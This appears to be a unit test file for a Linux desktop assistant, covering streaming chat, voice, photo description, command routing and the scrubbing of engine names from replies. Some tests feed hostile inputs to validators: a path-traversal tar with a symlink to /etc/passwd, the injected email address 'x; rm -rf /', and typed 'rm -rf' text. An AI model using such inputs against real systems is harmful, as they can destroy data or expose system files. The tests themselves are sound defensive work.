            self.assertEqual(got, ["Hello", " there", ", I am", " Qwen."])
            self.assertEqual(text, "Hello there, I am Qwen.")
            self.assertTrue(srv.requests[0]["stream"])
            self.assertEqual(srv.requests[0]["model"], "devos-ai")
        finally:
            srv.close()

    def test_json_fallback_and_non_stream(self):
        srv = FakeSSEServer(["Plain", " answer"], json_only=True)
        try:
            got = []
            m = engine.LocalModel(srv.url, timeout=5)
            self.assertEqual(m.chat([{"role": "user", "content": "x"}], on_delta=got.append), "Plain answer")
            self.assertEqual(got, ["Plain answer"])
            self.assertEqual(m.chat([{"role": "user", "content": "x"}]), "Plain answer")
            self.assertFalse(srv.requests[-1]["stream"])
        finally:
            srv.close()

    def test_stop_closes_the_stream(self):
        srv = FakeSSEServer([f" w{i}" for i in range(200)], delay=0.02)
        try:
            handle = engine.StreamHandle()
            got = []

            def on_delta(p):
                got.append(p)
                if len(got) == 3:
                    handle.stop()
            t0 = time.time()
            text = engine.LocalModel(srv.url, timeout=5).chat([{"role": "user", "content": "x"}],
                                                              on_delta=on_delta, cancel=handle)
            self.assertLess(time.time() - t0, 2.0)
            self.assertLessEqual(len(got), 4)
            self.assertTrue(text.startswith("w0 w1 w2"))
        finally:
            srv.close()

    def test_assistant_chat_streams_and_scrubs(self):
        srv = FakeSSEServer(["I am ", "Qwen2.5 ", "running on ", "Ubuntu."])
        try:
            ctx = tools.ToolContext(root="/nonexistent", which=lambda n: None, launcher=lambda a: True)
            a = engine.Assistant(model=engine.LocalModel(srv.url, timeout=5), ctx=ctx)
            got = []
            reply = a.chat("who are you", on_delta=got.append, cancel=engine.StreamHandle())
            self.assertEqual("".join(got), "I am Qwen2.5 running on Ubuntu.")
            self.assertNotIn("Qwen", reply.text)
            self.assertNotIn("Ubuntu", reply.text)
            self.assertEqual(reply.source, "model")
        finally:
            srv.close()

    def test_offline_and_sse_parsing(self):
        from unittest import mock
        with mock.patch.object(engine, "start_ai_service", lambda *a: False):
            r = engine.Assistant(model=engine.LocalModel("http://127.0.0.1:9", timeout=1),
                                 ctx=tools.ToolContext(root="/nonexistent")).chat("hi", on_delta=lambda p: None)
        self.assertFalse(r.ok)
        self.assertEqual(engine.parse_sse_delta('{"choices":[{"delta":{"content":"x"}}]}'), "x")
        self.assertEqual(engine.parse_sse_delta('{"choices":[{"delta":{}}]}'), "")
        self.assertIsNone(engine.parse_sse_delta("not json"))
        self.assertIsInstance(engine.parse_sse_delta('{"model_loaded": false}'), engine.ModelUnavailable)

    def test_preview_hides_half_words(self):
        self.assertEqual(engine.stream_preview("I am Qw"), "I am")
        self.assertEqual(engine.stream_preview("I am Qwen2.5 and"), "I am DevOS AI")
        self.assertEqual(engine.stream_preview("Hel"), "")


class TestSmarterAI(unittest.TestCase):

    def test_progress_parser(self):
        self.assertEqual(engine.parse_upgrade_progress("[Downloading] 312.0 MB/1066.0 MB\n"), (312.0, 1066.0))
        self.assertEqual(engine.parse_upgrade_progress("[Downloading] 0.0 MB / 1066.0 MB"), (0.0, 1066.0))
        self.assertIsNone(engine.parse_upgrade_progress("Smarter DevOS AI is ready."))

    def test_run_upgrade(self):
        class P:
            def __init__(self, argv, rc, out, err=""):
                self.argv, self.rc = argv, rc
                self.stdout = iter(out)
                self.stderr = types.SimpleNamespace(read=lambda: err)

            def wait(self):
                return self.rc
        calls, prog = [], []

        def popen_ok(argv, **kw):
            calls.append(argv)
            return P(argv, 0, ["[Downloading] 10.0 MB/1066.0 MB\n", "[Downloading] 1066.0 MB/1066.0 MB\n",
                               "Smarter DevOS AI is ready.\n"])
        ok, msg = engine.run_upgrade(False, lambda d, t: prog.append((d, t)), popen=popen_ok)
        self.assertTrue(ok)
        self.assertEqual(msg, "Smarter DevOS AI is ready.")
        self.assertEqual(calls[0], ["pkexec", "/usr/local/sbin/devos-ai-upgrade"])
        self.assertEqual(prog[-1], (1066.0, 1066.0))
        ok, msg = engine.run_upgrade(True, popen=lambda argv, **kw: calls.append(argv) or P(argv, 0, []))
        self.assertTrue(ok)
        self.assertEqual(calls[-1][-1], "--remove")
        ok, msg = engine.run_upgrade(False, popen=lambda argv, **kw: P(argv, 126, []))
        self.assertFalse(ok)
        ok, msg = engine.run_upgrade(False, popen=lambda argv, **kw: P(
            argv, 1, [], "Smarter DevOS AI needs about 2 GB of free space.\n"))
        self.assertEqual((ok, msg), (False, "Smarter DevOS AI needs about 2 GB of free space."))
        self.assertFalse(engine.smart_model_installed("/nonexistent/model.gguf"))


class FakeSegment:
    def __init__(self, text):
        self.text = text


class FakeWhisperModel:
    instances = []

    def __init__(self, path, **kw):
        self.path, self.kw = path, kw
        self.detected = "en"
        self.calls = []
        FakeWhisperModel.instances.append(self)

    def auto_detect_language(self, audio, **kw):
        return (self.detected, 0.9), {}

    def transcribe(self, audio, language="auto", **kw):
        self.calls.append(language)
        return [FakeSegment(" open blue tooth"), FakeSegment(" settings [BLANK_AUDIO]")]


class TestVoiceEngine(unittest.TestCase):

    def setUp(self):
        self.d = tempfile.mkdtemp()
        self.model = os.path.join(self.d, "ggml-base-q5_1.bin")
        with open(self.model, "wb") as fh:
            fh.write(b"\0" * (2 * 1024 * 1024))
        pkg = types.ModuleType("pywhispercpp")
        mod = types.ModuleType("pywhispercpp.model")
        mod.Model = FakeWhisperModel
        pkg.model = mod
        self.saved = {k: sys.modules.get(k) for k in ("pywhispercpp", "pywhispercpp.model")}
        sys.modules["pywhispercpp"] = pkg
        sys.modules["pywhispercpp.model"] = mod
        self.saved_float = voice.pcm_to_float
        voice.pcm_to_float = lambda pcm: "AUDIO"
        voice.Transcriber._model = None
        FakeWhisperModel.instances = []

    def tearDown(self):
        for k, v in self.saved.items():
            if v is None:
                sys.modules.pop(k, None)
            else:
                sys.modules[k] = v
        voice.pcm_to_float = self.saved_float
        voice.Transcriber._model = None
        shutil.rmtree(self.d, ignore_errors=True)

    def test_ready_needs_engine_and_model(self):
        self.assertTrue(voice.voice_ready(self.model))
        self.assertFalse(voice.voice_ready(os.path.join(self.d, "missing.bin")))
        sys.modules["pywhispercpp.model"] = None     # the import now fails
        self.assertFalse(voice.voice_ready(self.model))
        self.assertEqual(voice.VOICE_MISSING, "Voice commands aren't set up on this PC yet.")

    def test_english_and_bangla_are_kept(self):
        text = voice.Transcriber.transcribe(b"\0\0" * 100, path=self.model)
        m = FakeWhisperModel.instances[0]
        self.assertEqual(m.path, self.model)
        self.assertEqual(m.calls, ["en"])
        self.assertEqual(text, "open blue tooth settings")
        self.assertEqual(voice.fix_transcript(text), "open bluetooth settings")
        m.detected = "bn"
        voice.Transcriber.transcribe(b"\0\0" * 100, path=self.model)
        self.assertEqual(m.calls[-1], "bn")
        self.assertEqual(len(FakeWhisperModel.instances), 1, "the model is loaded once and kept")

    def test_other_languages_are_retried_as_english(self):
        voice.Transcriber.load(self.model).detected = "fr"
        voice.Transcriber.transcribe(b"\0\0" * 100, path=self.model)
        self.assertEqual(FakeWhisperModel.instances[0].calls, ["en"])
        self.assertEqual(voice.Transcriber.last_language, "en")

    def test_language_guess_without_detector(self):
        self.assertEqual(voice.guess_language("ব্লুটুথ চালু করো"), "bn")
        self.assertEqual(voice.guess_language("open chrome"), "en")
        self.assertEqual(voice.guess_language("Привет"), "other")
        self.assertEqual(voice.clean_segments([FakeSegment(" (music) hello "), FakeSegment("[BLANK_AUDIO]")]),
                         "hello")


class TestMarkdownBlocks(unittest.TestCase):

    def test_split_blocks(self):
        md = "Intro **bold**\n\n```bash\ndf -h\n```\n\n- one\n- two"
        blocks = markdown_lite.split_blocks(md)
        self.assertEqual(blocks[0], ("text", "Intro **bold**"))
        self.assertEqual(blocks[1], ("code", "bash", "df -h"))
        self.assertEqual(blocks[2][0], "text")
        self.assertEqual(markdown_lite.split_blocks("```\nunclosed"), [("code", "", "unclosed")])

    def test_line_height_and_links(self):
        h = markdown_lite.to_html("See https://example.com\n\n- a", line_height=155)
        self.assertIn("line-height:155%", h)
        self.assertIn(markdown_lite.LINK, h)


BANNED = ("vosk", "whisper", "moondream", "smolvlm", "tesseract", "poppler", "llama", "qwen", "ubuntu", "kde",
          "plasma", "hugging")


def _strings(node):
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        yield node.value
    elif isinstance(node, ast.JoinedStr):
        for v in node.values:
            yield from _strings(v)
    elif isinstance(node, (ast.Tuple, ast.List, ast.BinOp)):
        for child in ast.iter_child_nodes(node):
            yield from _strings(child)


def user_visible_strings(path):
    """String literals a user can see: messages passed to Reply/ToolResult, (ok, message) returns,
    raised errors and *_MISSING/*_OFFLINE/*_TEXT/*_LABEL/FEATURE constants. For the window module
    (assistant.py) every literal that is not a docstring counts."""
    with open(path, encoding="utf-8") as fh:
        tree = ast.parse(fh.read())
    docstrings = set()
    for n in ast.walk(tree):
        if isinstance(n, (ast.Module, ast.FunctionDef, ast.ClassDef, ast.AsyncFunctionDef)) and n.body and \
                isinstance(n.body[0], ast.Expr) and isinstance(n.body[0].value, ast.Constant):
            docstrings.add(id(n.body[0].value))
    window = path.endswith(("assistant.py", "overlay.py"))
    out = []
    for n in ast.walk(tree):
        if window:
            if isinstance(n, ast.Constant) and isinstance(n.value, str) and id(n) not in docstrings:
                out.append(n.value)
            continue
        if isinstance(n, ast.Call):
            name = getattr(n.func, "id", getattr(n.func, "attr", ""))
            if name in ("Reply", "ToolResult", "RuntimeError", "ModelUnavailable", "Outcome"):
                for a in list(n.args) + [k.value for k in n.keywords if k.arg == "text"]:
                    out += list(_strings(a))
        elif isinstance(n, ast.Return) and isinstance(n.value, ast.Tuple):
            out += list(_strings(n.value))
        elif isinstance(n, ast.Assign) and any(
                isinstance(t, ast.Name) and (t.id.endswith(("_MISSING", "_OFFLINE", "_TEXT", "_LABEL")) or
                                             t.id in ("FEATURE", "APP_PROMPT")) for t in n.targets):
            out += list(_strings(n.value))
    return out


class TestNoEngineNamesShown(unittest.TestCase):
    """Users never see the names of the engines, models or the base system."""

    def test_module_strings(self):
        for mod in ("assistant", "engine", "tools", "voice", "vision", "documents"):
            path = os.path.join(SYS_PATH_ASSISTANT, mod + ".py")
            strings = user_visible_strings(path)
            self.assertTrue(strings, mod)
            for s in strings:
                low = s.lower()
                for bad in BANNED:
                    self.assertNotIn(bad, low, f"{mod}.py shows {bad!r} in: {s[:120]!r}")

    def test_known_messages(self):
        import vision
        msgs = [voice.VOICE_MISSING, engine.MODEL_MISSING, engine.MODEL_OFFLINE, documents.PDF_TOOL_MISSING,
                tools.HELP_TEXT, tools.ABOUT_TEXT, engine.SMART_LABEL, vision.OCR_MISSING, vision.FEATURE,
                vision.download_size_label(), vision.runtime_supported()[1]]
        for m in msgs:
            for bad in BANNED:
                self.assertNotIn(bad, (m or "").lower(), m)


class TestPhotoUnderstanding(unittest.TestCase):

    def setUp(self):
        import vision
        self.vision = vision
        self.d = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.d, ignore_errors=True)

    def make_tar(self, members):
        import io
        import tarfile
        p = os.path.join(self.d, "rt.tar.gz")
        with tarfile.open(p, "w:gz") as tf:
            for name, data, link in members:
                ti = tarfile.TarInfo(name)
                if link:
                    ti.type = tarfile.SYMTYPE
                    ti.linkname = link
                    tf.addfile(ti)
                else:
                    ti.size = len(data)
                    ti.mode = 0o755
                    tf.addfile(ti, io.BytesIO(data))
        return p

    def test_pinned_files(self):
        v = self.vision
        self.assertEqual(v.LLAMA_RELEASE, "b11292")
        self.assertEqual([f[0] for f in v.VISION_FILES],
                         ["SmolVLM-256M-Instruct-Q8_0.gguf", "mmproj-SmolVLM-256M-Instruct-Q8_0.gguf",
                          "llama-b11292-bin-ubuntu-x64.tar.gz"])
        self.assertTrue(all(len(f[3]) == 64 for f in v.VISION_FILES))
        self.assertEqual(v.download_size_label(), "296 MB")
        self.assertEqual(v.download_button_label(), "Photo understanding — one-time 296 MB download")
        self.assertEqual(v.runtime_supported("Linux", "x86_64"), (True, ""))
        self.assertFalse(v.runtime_supported("Linux", "aarch64")[0])
        self.assertFalse(v.model_installed(self.d))

    def test_extract_only_runtime(self):
        v = self.vision
        p = self.make_tar([("llama-b1/llama-mtmd-cli", b"#!bin", None), ("llama-b1/libmtmd.so.0.5.0", b"x", None),
                           ("llama-b1/libmtmd.so.0", b"", "libmtmd.so.0.5.0"),
                           ("llama-b1/libggml-cpu-haswell.so", b"x", None), ("llama-b1/llama-server", b"x", None),
                           ("llama-b1/libggml-rpc.so", b"x", None), ("llama-b1/libllama-server-impl.so", b"x", None)])
        out = os.path.join(self.d, "rt")
        taken = v.extract_runtime(p, out)
        self.assertEqual(sorted(os.listdir(out)), ["libggml-cpu-haswell.so", "libmtmd.so.0", "libmtmd.so.0.5.0",
                                                   "llama-mtmd-cli"])
        self.assertIn("llama-mtmd-cli", taken)
        self.assertTrue(os.access(os.path.join(out, "llama-mtmd-cli"), os.X_OK))
        bad = self.make_tar([("../llama-mtmd-cli", b"x", None)])
        with self.assertRaises(ValueError):
            v.extract_runtime(bad, os.path.join(self.d, "rt2"))
        bad = self.make_tar([("a/llama-mtmd-cli", b"x", None), ("a/libmtmd.so.0", b"", "/etc/passwd")])
        with self.assertRaises(ValueError):
            v.extract_runtime(bad, os.path.join(self.d, "rt3"))

    def test_describe_runs_the_cli(self):
        v = self.vision
        for name, _u, size, _s in (v.MODEL_FILE, v.MMPROJ_FILE):
            with open(os.path.join(self.d, name), "wb") as fh:
                fh.truncate(size)
        os.makedirs(v.runtime_dir(self.d))
        with open(v.cli_path(self.d), "w") as fh:
            fh.write("#!/bin/sh\n")
        os.chmod(v.cli_path(self.d), 0o755)
        self.assertTrue(v.model_installed(self.d))
        seen = []

        def runner(argv, env):
            seen.append((argv, env))
            return 0, "\n The image shows a cat.<end_of_utterance>\n"
        if v.runtime_supported()[0]:
            ans = v.VisionModel.describe("/tmp/cat.jpg", "", vision_dir=self.d, runner=runner)
            self.assertEqual(ans, "The image shows a cat.")
            argv = seen[0][0]
            self.assertEqual(argv[0], v.cli_path(self.d))
            for flag in ("-m", "--mmproj", "--image", "-p", "-n", "--temp", "-lv"):
                self.assertIn(flag, argv)
            self.assertNotIn("--log-disable", argv)
            self.assertEqual(argv[argv.index("--image") + 1], "/tmp/cat.jpg")
            with self.assertRaises(RuntimeError):
                v.VisionModel.describe("/tmp/cat.jpg", "", vision_dir=self.d, runner=lambda a, e: (1, ""))


# ---------------------------------------------------------------------------
# Commands that do things: typo tolerance, notes, typing, email, reminders,
# folders, files, media, closing apps; hands-free voice
# ---------------------------------------------------------------------------

import listen  # noqa: E402

USER_SEARCH = "can you search in google about latest core update of google core search"
USER_NOTE = "cab you open notepad, just save my name imran ahmed, number: 01517864761"
NOW = datetime.datetime(2026, 10, 13, 9, 5, 0)


class TestCommandRouting(unittest.TestCase):

    def test_users_two_sentences_verbatim(self):
        r = tools.route(USER_SEARCH)
        self.assertEqual([a.name for a in r.actions], ["web_search"])
        self.assertEqual(r.actions[0].args["query"], "latest core update of google core search")
        self.assertEqual(r.actions[0].args["url"],
                         "https://www.google.com/search?q=latest+core+update+of+google+core+search")
        r = tools.route(USER_NOTE)
        self.assertEqual([a.name for a in r.actions], ["write_note"])
        self.assertEqual(r.actions[0].args["text"], "Name: imran ahmed\nNumber: 01517864761")
        self.assertEqual(r.actions[0].args["app"], "notepad")

    def test_phrasings(self):
        # (text, action names, {arg: value} for the first action)
        cases = [
            ("search on google for best budget phones 2026", ["web_search"], {"query": "best budget phones 2026"}),
            ("please search in google about how google ranks pages", ["web_search"],
             {"query": "how google ranks pages"}),
            ("google what is the core update", ["web_search"], {"query": "what is the core update"}),
            ("look up flights to sylhet on google", ["web_search"], {"query": "flights to sylhet"}),
            ("find cheap hotels in cox's bazar on google", ["web_search"], {"query": "cheap hotels in cox's bazar"}),
            ("search youtube for how to search on google", ["web_search"],
             {"engine": "youtube", "query": "how to search on google"}),
            ("play despacito", ["web_search"], {"engine": "youtube", "query": "despacito"}),
            ("play tahsan songs on youtube", ["web_search"], {"engine": "youtube", "query": "tahsan songs"}),
            ("open chrome and play lofi beats on youtube", ["web_search"], {"engine": "youtube"}),
            ("directions to hazrat shahjalal airport", ["web_search"],
             {"engine": "directions", "query": "hazrat shahjalal airport"}),
            ("how do i get to dhanmondi lake", ["web_search"], {"engine": "directions"}),
            ("where is sajek valley on the map", ["web_search"], {"engine": "maps", "query": "sajek valley"}),
            ("who is rabindranath tagore on wikipedia", ["web_search"],
             {"engine": "wikipedia", "query": "rabindranath tagore"}),
            ("search wikipedia for black holes", ["web_search"], {"engine": "wikipedia", "query": "black holes"}),
            ("search for hp laptop and open notepad", ["web_search", "open_app"], {"query": "hp laptop"}),
            ("search for salt and pepper recipes", ["web_search"], {"query": "salt and pepper recipes"}),
            ("open notepad and write: buy milk, eggs and bread", ["write_note"],
             {"text": "buy milk, eggs and bread"}),
            ("open notepad and type Meeting at 5 PM, room 3", ["write_note"], {"text": "Meeting at 5 PM, room 3"}),
            ("open notepad then write hello world", ["write_note"], {"text": "hello world"}),
            ("write shopping list in notepad", ["write_note"], {"text": "shopping list"}),
            ("take a note: call the bank at 3", ["write_note"], {"text": "call the bank at 3"}),
            ("note: the wifi password is on the router", ["write_note"],
             {"text": "the wifi password is on the router"}),
            ("jot down pick up the kids", ["write_note"], {"text": "pick up the kids"}),
            ("remember that the car is in slot B4", ["write_note"], {"text": "the car is in slot B4"}),
            ("save my name Imran, phone 0171 and email a@b.com", ["write_note"],
             {"text": "Name: Imran\nPhone: 0171\nEmail: a@b.com"}),
            ("open text editor and write hello", ["write_note"], {"app": "kate"}),
            ("open word and write Dear Sir,", ["write_note"], {"app": "writer", "text": "Dear Sir,"}),
            ("type hello world", ["type_text"], {"text": "hello world"}),
            ("write Thank you for your order here", ["type_text"], {"text": "Thank you for your order"}),
            ("open terminal and type ls -la", ["open_app_and_type"], {"app": "terminal", "text": "ls -la"}),
            ("open chrome and type facebook.com", ["open_url"], {"url": "https://facebook.com"}),
            ("open chrome and type best laptops", ["web_search"], {"query": "best laptops"}),
            ("send an email to imran@example.com about the meeting saying see you at 5", ["compose_email"],
             {"to": "imran@example.com", "subject": "the meeting", "body": "see you at 5"}),
            ("email imran at gmail dot com saying hello", ["compose_email"], {"to": "imran@gmail.com"}),
            ("remind me in 10 minutes to call mom", ["reminder"], {"seconds": 600, "message": "call mom"}),
            ("remind me to drink water in half an hour", ["reminder"], {"seconds": 1800, "message": "drink water"}),
            ("set a timer for 5 minutes", ["reminder"], {"seconds": 300, "kind": "timer"}),
            ("start a 2 hour timer", ["reminder"], {"seconds": 7200}),
            ("make a folder called Projects on the desktop", ["create_folder"],
             {"name": "Projects", "where": "desktop"}),
            ("create a new folder in documents named Tax 2026", ["create_folder"],
             {"name": "Tax 2026", "where": "documents"}),
            ("open the file report.pdf", ["open_path"], {"name": "report.pdf"}),
            ("find my file called budget", ["open_path"], {"name": "budget"}),
            ("open my downloads", ["open_folder"], {"folder": "downloads"}),
            ("play music", ["media"], {"op": "music"}),
            ("pause the music", ["media"], {"op": "pause"}),
            ("next song", ["media"], {"op": "next"}),
            ("previous track", ["media"], {"op": "previous"}),
            ("close chrome", ["close_app"], {"name": "chrome"}),
            ("quit the calculator app", ["close_app"], {"name": "calculator"}),
            ("opne notpad", ["open_app"], {"name": "notepad"}),
            ("open crome and serch hp laptop", ["web_search"], {"query": "hp laptop", "browser": "chrome"}),
            ("plz opne the calculater", ["open_app"], {"name": "calculator"}),
            ("open setings", ["open_settings"], {"page": ""}),
            ("lanch termnal", ["open_app"], {"name": "terminal"}),
            ("open notepad and right buy eggs", ["write_note"], {"text": "buy eggs"}),
        ]
        self.assertGreaterEqual(len(cases), 40)
        for text, want, args in cases:
            with self.subTest(text=text):
                r = tools.route(text)
                self.assertEqual([a.name for a in r.actions], want, text)
                for k, v in args.items():
                    self.assertEqual(r.actions[0].args.get(k), v, f"{text}: {k}")

    def test_composing_stays_with_the_model(self):
        r = tools.route("open notepad and write a poem about rain")
        self.assertEqual([a.name for a in r.actions], ["open_app"])
        self.assertEqual(r.leftover, "write a poem about rain")
        for text in ("write a poem about rain", "type of laptop for gaming?", "write an essay about rivers"):
            self.assertEqual(tools.route(text).actions, [], text)

    def test_reminder_at_clock_time(self):
        ctx = tools.ToolContext(root="/nonexistent", now=lambda: NOW)
        a = tools.route("remind me at 5 pm to go home", ctx).actions[0]
        self.assertEqual((a.name, a.args["seconds"], a.args["message"]), ("reminder", 7 * 3600 + 55 * 60, "go home"))
        a = tools.route("remind me at 8:30 to stretch", ctx).actions[0]
        self.assertEqual(a.args["seconds"], 11 * 3600 + 25 * 60)     # 8:30 has passed: the evening one


class TestTypoTolerance(unittest.TestCase):

    def test_command_words(self):
        for typo, fixed in (("opne", "open"), ("notpad", "notepad"), ("crome", "chrome"), ("serch", "search"),
                            ("calculater", "calculator"), ("termnal", "terminal"), ("cab", "can"),
                            ("youtub", "youtube"), ("setings", "settings"), ("clsoe", "close"), ("lanch", "launch")):
            self.assertEqual(tools.correct_word(typo), fixed, typo)
        for word in ("how", "the", "imran", "ahmed", "mom", "report", "look", "made", "son", "01517864761"):
            self.assertEqual(tools.correct_word(word), word, word)

    def test_payload_is_never_corrected(self):
        t = tools.preprocess("cab you opne notpad and write: Imran Ahmd, crome 0151786, serch")
        self.assertEqual(t, "can you open notepad and write: Imran Ahmd, crome 0151786, serch")
        t = tools.preprocess(USER_NOTE)
        self.assertEqual(t, "can you open notepad, just save my name imran ahmed, number: 01517864761")
        self.assertEqual(tools.preprocess("open the file reprot.pdf"), "open the file reprot.pdf")
        self.assertEqual(tools.preprocess("search in google about opne notpad"), "search in google about opne notpad")

    def test_phonetic(self):
        self.assertEqual(tools.preprocess("upon note pad"), "open notepad")
        self.assertEqual(tools.preprocess("open you tube"), "open youtube")

    def test_field_parser(self):
        self.assertEqual(tools.parse_fields("my name imran ahmed, number: 01517864761"),
                         "Name: imran ahmed\nNumber: 01517864761")
        self.assertEqual(tools.parse_fields("name is Rahim and my phone number is +880 1711-000000"),
                         "Name: Rahim\nNumber: +880 1711-000000")
        self.assertIsNone(tools.parse_fields("buy milk"))


class ToolCase(unittest.TestCase):
    TOOLS = ALL_TOOLS | {"xdotool", "wmctrl", "notify-send", "systemd-run", "kdialog", "vlc", "playerctl"}

    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="devos-ai-cmd-")
        self.home = os.path.join(self.root, "home/user")
        os.makedirs(self.home)
        self.launched, self.ran, self.killed = [], [], []
        self.t = [0.0]
        self.replies = {}
        self.ctx = self.make_ctx()
        apps = os.path.join(self.root, "usr/share/applications")
        os.makedirs(apps)
        for did, body in (("devos-browser", "Name=Chrome\nExec=devos-browser %U"),
                          ("devos-notepad", "Name=Notepad\nExec=/usr/bin/python3 /x/notepad.py %F\n"
                                            "StartupWMClass=notepad.py"),
                          ("org.kde.konsole", "Name=Konsole\nGenericName=Terminal\nExec=konsole"),
                          ("org.kde.kcalc", "Name=KCalc\nGenericName=Scientific Calculator\nExec=kcalc"),
                          ("org.kde.plasmashell", "Name=Plasma\nExec=plasmashell\nNoDisplay=true")):
            with open(os.path.join(apps, did + ".desktop"), "w") as fh:
                fh.write("[Desktop Entry]\nType=Application\n" + body + "\n")

    def make_ctx(self, tools_set=None, env=None):
        return tools.ToolContext(
            root=self.root, home=self.home, which=fake_which(tools_set or self.TOOLS),
            launcher=lambda argv: self.launched.append(argv) or True, runner=self.runner,
            now=lambda: NOW, sleep=self.sleep, clock=lambda: self.t[0], env=env or {"XDG_SESSION_TYPE": "x11"},
            killer=lambda pid, sig: self.killed.append((pid, sig)), uid=1000)

    def sleep(self, s):
        self.t[0] += s

    def runner(self, argv, timeout=8):
        self.ran.append(argv)
        r = self.replies.get(tuple(argv[:2]))
        if callable(r):
            return r(argv)
        return r if r is not None else (0, "")

    def tearDown(self):
        shutil.rmtree(self.root, ignore_errors=True)

    def run1(self, text, dry=True):
        r = tools.route(text, self.ctx)
        self.assertTrue(r.actions, text)
        return tools.execute(r.actions[0], self.ctx, dry_run=dry)


class TestWriteNote(ToolCase):

    def test_users_note_is_saved_and_opened(self):
        res = self.run1(USER_NOTE, dry=False)
        self.assertTrue(res.ok, res.text)
        folder = os.path.join(self.home, "Documents", "Notes")
        name = "2026-10-13 09-05 Name imran ahmed Number 01517864761.txt"
        path = os.path.join(folder, name)
        with open(path, encoding="utf-8") as fh:
            self.assertEqual(fh.read(), "Name: imran ahmed\nNumber: 01517864761")
        self.assertEqual(res.text, f"Saved to **Documents/Notes/{name}** and opened it in Notepad.")
        self.assertEqual(self.launched, [[tools.PYTHON, tools.NOTEPAD_PY, path]])
        label, act = res.buttons[0]
        self.assertEqual((label, act.name, act.args["path"]), ("Open folder", "open_path", folder))
        # a second note in the same minute does not overwrite the first
        res2 = self.run1(USER_NOTE, dry=False)
        self.assertTrue(res2.data["path"].endswith("Number 01517864761 (2).txt"))
        self.assertTrue(tools.execute(act, self.ctx, dry_run=True).ok, "the button opens the Notes folder")

    def test_unicode_and_exact_text(self):
        text = "বাজার: চাল, ডাল\nLine 2  with  spaces"
        res = tools.execute(tools.Action("write_note", {"text": text}), self.ctx, dry_run=False)
        with open(res.data["path"], encoding="utf-8") as fh:
            self.assertEqual(fh.read(), text)
        self.assertIn("বাজার চাল ডাল", os.path.basename(res.data["path"]))

    def test_dry_run_writes_nothing(self):
        res = self.run1("take a note: call the bank")
        self.assertEqual(res.data["content"], "call the bank")
        self.assertFalse(os.path.exists(res.data["path"]))
        self.assertEqual(self.launched, [])

    def test_kate(self):
        res = tools.execute(tools.Action("write_note", {"text": "x", "app": "kate"}),
                            self.make_ctx(self.TOOLS | {"kate"}), dry_run=True)
        self.assertEqual(res.plan[0][0], "kate")
        self.assertIn("Text Editor", res.text)


class TestTyping(ToolCase):

    def test_open_app_and_type_plan(self):
        res = self.run1("open terminal and type ls -la")
        self.assertTrue(res.ok)
        self.assertEqual(res.plan[0], ["gtk-launch", "org.kde.konsole"])
        self.assertEqual(res.plan[1], ["xdotool", "search", "--sync", "--onlyvisible", "--class", "konsole"])
        self.assertEqual(res.plan[-1], ["xdotool", "type", "--delay", "15", "--", "ls -la"])
        self.assertNotIn(["xdotool", "key", "Return"], res.plan)
        self.assertEqual(self.launched, [])

    def test_open_app_and_type_waits_for_window_and_focus(self):
        calls = {"n": 0}

        def search(argv):
            calls["n"] += 1
            return (0, "111\n") if calls["n"] < 4 else (0, "111\n222\n")
        self.replies[("xdotool", "search")] = search
        self.replies[("xdotool", "getwindowname")] = lambda argv: (0, "Konsole")
        self.replies[("xdotool", "getactivewindow")] = lambda argv: (0, "222\n")
        res = tools.execute(tools.Action("open_app_and_type", {"app": "terminal", "text": "echo hi"}), self.ctx)
        self.assertTrue(res.ok, res.text)
        self.assertEqual(self.launched, [["gtk-launch", "org.kde.konsole"]])
        self.assertIn(["xdotool", "windowactivate", "--sync", "222"], self.ran)
        self.assertEqual(self.ran[-1], ["xdotool", "type", "--delay", "15", "--", "echo hi"])

    def test_no_typing_when_focus_is_elsewhere(self):
        self.replies[("xdotool", "search")] = lambda argv: (0, "222\n") if self.launched else (0, "")
        self.replies[("xdotool", "getactivewindow")] = lambda argv: (0, "999\n")
        res = tools.execute(tools.Action("open_app_and_type", {"app": "terminal", "text": "rm -rf x"}), self.ctx)
        self.assertFalse(res.ok)
        self.assertFalse(any(a[:2] == ["xdotool", "type"] for a in self.ran))

    def test_window_never_appears(self):
        res = tools.execute(tools.Action("open_app_and_type", {"app": "terminal", "text": "x"}), self.ctx)
        self.assertFalse(res.ok)
        self.assertIn("didn't appear", res.text)
        self.assertGreaterEqual(self.t[0], 12.0)

    def test_type_text(self):
        res = self.run1("type hello world")
        self.assertEqual(res.plan, [["xdotool", "type", "--delay", "15", "--", "hello world"]])
        self.replies[("xdotool", "getactivewindow")] = lambda argv: (0, "555\n")
        a = tools.Action("type_text", {"text": "hello", "avoid_window": "555"})
        self.assertEqual(tools.execute(a, self.ctx).text, tools.CLICK_TO_TYPE_TEXT)
        res = tools.execute(tools.Action("type_text", {"text": "hello"}), self.ctx)
        self.assertTrue(res.ok, res.text)
        self.assertEqual(self.ran[-1], ["xdotool", "type", "--delay", "15", "--", "hello"])

    def test_typing_degrades_clearly(self):
        ctx = self.make_ctx(env={"XDG_SESSION_TYPE": "wayland"})
        self.assertEqual(tools.execute(tools.Action("type_text", {"text": "x"}), ctx).text,
                         tools.TYPING_X11_ONLY_TEXT)
        ctx = self.make_ctx(self.TOOLS - {"xdotool"})
        self.assertEqual(tools.execute(tools.Action("type_text", {"text": "x"}), ctx).text, tools.TYPING_MISSING_TEXT)


class TestEmailReminderFolderFiles(ToolCase):

    def test_mailto_encoding(self):
        self.assertEqual(tools.mailto_url("a@b.com", "Hi & bye?", "line1\nline2 ✓"),
                         "mailto:a@b.com?subject=Hi%20%26%20bye%3F&body=line1%0Aline2%20%E2%9C%93")
        res = self.run1("send an email to imran@example.com about Q4 report saying see you at 5")
        self.assertEqual(res.plan, [["xdg-open",
                                     "mailto:imran@example.com?subject=Q4%20report&body=see%20you%20at%205"]])
        self.assertIn("never send", res.text)
        bad = tools.execute(tools.Action("compose_email", {"to": "x; rm -rf /"}), self.ctx, dry_run=True)
        self.assertFalse(bad.ok)

    def test_reminder_command(self):
        res = self.run1("remind me in 10 minutes to call mom")
        argv = res.plan[0]
        self.assertEqual(argv[:7], ["systemd-run", "--user", "--quiet", "--collect",
                                    "--unit=devos-reminder-20261013090500-600", "--on-active=600s",
                                    "--timer-property=AccuracySec=1s"])
        self.assertEqual(argv[7:], ["/usr/bin/notify-send", "--app-name=DevOS AI", "--urgency=critical",
                                    "--icon=chronometer", "Reminder", "Call mom"])
        self.assertIn("9:15 AM", res.text)
        self.assertIn("call mom", res.text)
